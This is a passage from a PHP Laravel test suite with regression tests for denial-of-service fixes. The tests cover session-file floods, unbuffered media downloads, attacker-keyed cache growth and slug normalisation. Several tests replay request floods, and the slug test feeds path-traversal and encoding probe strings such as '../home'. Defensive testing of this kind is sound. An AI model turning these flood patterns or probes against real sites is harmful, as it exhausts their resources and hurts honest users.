     * So this test asserts BOTH halves, and the second half is the one that
     * stops the next person "simplifying" the allow-list away: state that must
     * survive server-side still lands on disk.
     */
    public function test_anonymous_404s_do_not_mint_a_session_file_each(): void
    {
        $dir = storage_path('framework/testing/sessions-'.uniqid());
        File::ensureDirectoryExists($dir);

        config()->set('session.driver', 'file');
        config()->set('session.files', $dir);
        config()->set('session.lottery', [0, 100]); // production default is 2/100

        $owner = $this->tenantOwner('Session Co', 'owner@sessionco.test');

        try {
            $before = count(File::files($dir));

            for ($i = 0; $i < 40; $i++) {
                $this->get('/flood-'.bin2hex(random_bytes(6)).'-'.$i)->assertNotFound();
            }

            $minted = count(File::files($dir)) - $before;

            $this->assertLessThanOrEqual(1, $minted,
                "{$minted} session files were written by 40 anonymous 404s — an anonymous inode flood");

            // NO COLLATERAL, part 1: the login form still renders, so its CSRF
            // token still round-trips (a 419 on every login would be the
            // obvious way to "fix" the flood).
            $this->get('/login')->assertOk();

            // NO COLLATERAL, part 2: a session that carries REAL state must
            // still be persisted server-side. A cookie session cannot be
            // revoked, so an authenticated one landing there would be the
            // opposite of a fix.
            $beforeLogin = count(File::files($dir));

            $this->post('/login', [
                'email' => 'owner@sessionco.test',
                'password' => 'secret-pass-123',
            ]);

            $this->assertAuthenticated();
            $this->assertGreaterThanOrEqual(1, count(File::files($dir)) - $beforeLogin,
                'an AUTHENTICATED session was not written to the server-side driver — '
                .'the disposable allow-list has grown to cover real state');
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * ORIGINAL HOLE: /site/media/{id} is anonymous, has NO throttle, and reads
     * the WHOLE object into PHP memory on every request
     * (`response(Storage::disk('avatars')->get($path))`). With AVATARS_DRIVER=s3
     * that is also an S3 GET and an egress charge per request, and at 500 orgs
     * every one of them has a public media library.
     *
     * THE FIX: the route streams (`$disk->response()`), and the mime verdict —
     * the reason the whole object used to be read on every hit — is derived once
     * from a bounded head-sniff and cached against the row id plus the byte
     * size. No part of that key is attacker-supplied.
     *
     * REQUIRED OUTCOME, and each of these is the thing that actually bounds the
     * per-request cost:
     *   1. the response is streamed, not materialised in PHP memory;
     *   2. a repeat hit does not re-sniff the object (the verdict is cached);
     *   3. a conditional request short-circuits to an empty 304;
     *   4. a 60-request flood mints no per-request cache entries.
     *
     *   5. and a per-address ceiling sits on top, deliberately loose (600/min),
     *      because a marketing page pulls a dozen images in one load and
     *      refusing an honest visitor an image is a worse outcome than the
     *      attack. Streaming is the defence; the ceiling is the backstop.
     */
    public function test_site_media_is_streamed_and_not_fully_buffered_per_request(): void
    {
        Storage::fake('avatars');

        $png = (string) file_get_contents($this->realImage(400, 400, 'png', 'big.png')->getRealPath());
        Storage::disk('avatars')->put('site/big.png', $png);

        $media = SiteMedia::create(['path' => 'site/big.png', 'mime' => 'image/png', 'original_name' => 'big.png']);

        $first = $this->get('/site/media/'.$media->id);
        $first->assertOk();
        $this->assertStringContainsString('image/png', (string) $first->headers->get('Content-Type'));

        // 1. Streamed, not buffered.
        $this->assertTrue(
            $first->baseResponse instanceof StreamedResponse || $first->baseResponse instanceof BinaryFileResponse,
            'the endpoint buffers the whole object into PHP memory again ('
                .get_class($first->baseResponse).'); with AVATARS_DRIVER=s3 that is a full GET per hit',
        );
        $this->assertSame(strlen($png), (int) $first->headers->get('Content-Length'));
        $this->assertSame($png, $first->streamedContent(), 'the served bytes are not the stored bytes');

        // 2. The mime verdict is remembered, so a repeat hit does not re-read
        //    the object just to decide what it is.
        $this->assertTrue(
            Cache::has('site_media_mime:'.$media->id.':'.strlen($png)),
            'the mime verdict is re-derived on every hit — that re-read WAS the amplifier',
        );

        // 3. A conditional request costs nothing at all.
        $etag = (string) $first->headers->get('ETag');
        $this->assertNotSame('', $etag, 'no ETag: a client has no way to avoid re-fetching the object');

        $conditional = $this->get('/site/media/'.$media->id, ['If-None-Match' => $etag]);
        $this->assertSame(304, $conditional->getStatusCode());
        $this->assertSame('', $conditional->getContent());

        // 4. The original flood, replayed: still correct, and it does not grow
        //    the cache store one entry per request.
        $keysBefore = count(Cache::getStore()->all());

        for ($i = 0; $i < 60; $i++) {
            $r = $this->get('/site/media/'.$media->id);

            $this->assertSame(200, $r->getStatusCode(), "request {$i} stopped serving the object");
        }

        $this->assertLessThanOrEqual(
            $keysBefore + 3,
            count(Cache::getStore()->all()),
            'the flood minted a cache entry per request',
        );

        // 5. The ceiling exists, is per-ADDRESS (there is no user to key on
        //    here), and is loose enough that an honest page of images is safe.
        $ceiling = (int) (new \ReflectionClassConstant(SitePageController::class, 'MEDIA_HITS_PER_MINUTE'))->getValue();

        $this->assertGreaterThanOrEqual(120, $ceiling,
            'the site-media ceiling is now tight enough to refuse an honest visitor a page of images');

        $flooder = '198.51.100.4';
        for ($i = 0; $i < $ceiling; $i++) {
            RateLimiter::hit('site-media:'.$flooder, 60);
        }

        $this->withServerVariables(['REMOTE_ADDR' => $flooder])
            ->get('/site/media/'.$media->id)
            ->assertStatus(429);

        // NO COLLATERAL: one address exhausting its budget must not affect
        // anybody else — this route is the whole marketing site's images.
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.5'])
            ->get('/site/media/'.$media->id)
            ->assertOk();
    }

    /**
     * A whole CLASS of bug rather than one instance: an anonymous route that
     * mints a cache entry keyed on attacker input lets one IP fill the cache
     * store with garbage. The public catch-all was patched for this; these are
     * its siblings, and they must stay clean.
     *
     * The test is written as a SCALING property, not as a pattern match on key
     * names, and that is deliberate. The original version flagged any key
     * containing a long hex run — which started reporting a false finding the
     * moment a legitimate per-IP rate-limiter bucket appeared on one of these
     * routes (RateLimiter stores `md5(key)` and `md5(key).':timer'`). A
     * fixed-input hash is indistinguishable from an attacker-derived one by
     * inspection; it is entirely distinguishable by BEHAVIOUR. Infrastructure
     * keys appear once and then stop; an attacker-keyed store grows with every
     * fresh batch of inputs. So: two batches of distinct probes, and the second
     * one must add nothing.
     */
    public function test_other_anonymous_routes_do_not_mint_attacker_keyed_cache_entries(): void
    {
        DefaultSiteContent::ensure();

        $probe = function (): void {
            for ($i = 0; $i < 25; $i++) {
                $rand = bin2hex(random_bytes(6));
                $this->get('/blog/'.$rand);
                $this->get('/'.$rand);
                $this->get('/desktop-updates/'.$rand.'.yml');
                $this->get('/site/media/'.random_int(100000, 999999));
            }
        };

        $keys = fn (): array => array_keys(Cache::getStore()->all());

        $before = $keys();
        $probe();                                   // 100 distinct attacker strings
        $afterFirst = $keys();
        $probe();                                   // 100 more, all different again
        $afterSecond = $keys();

        // Whatever the first batch created, the second batch must create nothing
        // — a store that grows per distinct input is the finding.
        $grew = array_values(array_diff($afterSecond, $afterFirst));

        $this->assertSame([], $grew,
            'an anonymous route mints a cache entry per distinct attacker input: '.json_encode($grew));

        // ...and belt and braces: no key echoes an attacker string verbatim.
        $firstBatch = array_values(array_diff($afterFirst, $before));

        foreach ($firstBatch as $key) {
            $this->assertSame(0, preg_match('/flood|blog\/[0-9a-f]{12}/', (string) $key),
                "cache key '{$key}' was built from the request path");
        }
    }

    /**
     * The slug normaliser, probed from the sibling entry point rather than
     * through the route, so a fix applied only in the controller does not look
     * like a fix applied in the model. Fifteen spellings of "home" must not
     * become fifteen cache entries.
     */
    public function test_slug_normalisation_cannot_be_walked_around(): void
    {
        DefaultSiteContent::ensure();

        $probes = [
            'HOME', ' home ', '/home/', 'home/', 'home//', 'ho%6de', 'home%20',
            "home\t", 'home.', '-home', 'home-', str_repeat('a', 120), str_repeat('a', 121),
            'a/b/c', '../home', 'home/../home',
        ];

        $keysBefore = count(array_filter(
            array_keys(Cache::getStore()->all()),
            fn ($k) => str_contains((string) $k, 'site_page.')
        ));

        foreach ($probes as $p) {
            SitePage::published($p);
        }

        $keysAfter = count(array_filter(
            array_keys(Cache::getStore()->all()),
            fn ($k) => str_contains((string) $k, 'site_page.')
        ));

        $this->assertLessThanOrEqual(
            $keysBefore + 1,
            $keysAfter,
            'a slug variant minted an extra cache entry',
        );
    }

    /** Sanity: the honest installer download still works after all of the above. */
    public function test_the_ordinary_installer_download_is_not_broken(): void
    {
        $dir = storage_path('framework/testing/installers-'.uniqid());
        File::ensureDirectoryExists($dir);
        config()->set('desktop.installers_path', $dir);
        config()->set('desktop.fallback_paths', []);
        config()->set('desktop.x_accel_prefix', null);
        File::put($dir.'/latest.yml', "version: 9.9.9\npath: StaffvoraSetup.exe\n");
        File::put($dir.'/StaffvoraSetup.exe', 'bytes');

        try {
            DesktopDownloadController::forgetCachedReleases();

            $this->assertSame('9.9.9', DesktopDownloadController::windowsRelease()['version']);
            $this->get('/desktop-updates/latest.yml')->assertOk();
            $this->assertSame('bytes',
                $this->get('/desktop-updates/StaffvoraSetup.exe')->assertOk()->streamedContent());
        } finally {
            File::deleteDirectory($dir);
        }
    }
}
